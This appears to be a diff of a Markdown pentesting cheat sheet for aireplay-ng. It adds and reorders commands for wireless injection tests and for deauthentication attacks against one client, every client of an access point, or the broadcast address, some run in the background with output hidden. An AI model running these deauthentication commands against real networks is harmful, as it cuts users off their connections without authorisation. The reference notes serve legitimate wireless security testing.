@@ -31,18 +31,35 @@ Aireplay-ng supports the following attacks. They are listed along with the corre
 
 
 ```bash
-# check if we can inject in visible APs. The injection test measures ping response times to the AP
+# check if we can inject invisible APs. The injection test measures ping response times to the AP
 sudo aireplay-ng -9 wlan0mon 
 
 # check if we can inject in a specific AP
 sudo aireplay-ng -e <ap_name> -a <MAC> wlan0mon
+```
 
+### Deauthentication Attack
+```bash
 # deauth a client (1000000 is a large number of packets, to keep the deauth attack working for a while):
-sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon
+sudo aireplay-ng -0 10 -a <bssid> -c <client_MAC> wlan0mon
 
 # To background the command and don't see output
-sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon &> /dev/null &
+sudo aireplay-ng --deauth 10 -a <bssid> -c <client_MAC> wlan0mon &> /dev/null &
 
+# To deauth every client connected to a BSSID don't specify a client <MAC>
+aireplay-ng --deauth 4 -a <bssid> wlan0mon &> /dev/null &
+
+# Can be done as well by using broadcast MAC "FF:FF:FF:FF:FF:FF" 
+aireplay-ng --deauth 4 -a <bssid> -c FF:FF:FF:FF:FF:FF wlan0mon
+
+# Same as above, but without expecting to receive probes
+sudo aireplay-ng -e <ap_name> -a <MAC> -D wlan0mon
+
+# if we have two wifi cards, wlan0mon and wlan1mon, card-to-card test, to make sure they can inject. if it says (5/7 error, still can be used to attack an AP)
+sudo aireplay-ng -9 -i wlan1mon wlan0mon
+```
+### Pro Tips
+```bash
 # with "jobs" we can see the jobs backgrounded with &. each has an ID
 jobs
 
@@ -51,14 +68,4 @@ killall aireplay-ng
 
 # kill only the first process in the "jobs" list:
 kill %1
-
-# To deauth every client connected to a BSSID don't specify a client <MAC>
-aireplay-ng --deauth 4 -a <bssid> wlan0mon &> /dev/null &
-
-# Same as above, but without expecting to receive probes
-sudo aireplay-ng -e <ap_name> -a <MAC> -D wlan0mon
-
-# if we have two wifi cards, wlan0mon and wlan1mon, card-to-card test, to make sure they can inject. if it says (5/7 error, still can be used to attack an AP)
-sudo aireplay-ng -9 -i wlan1mon wlan0mon
-
 ```
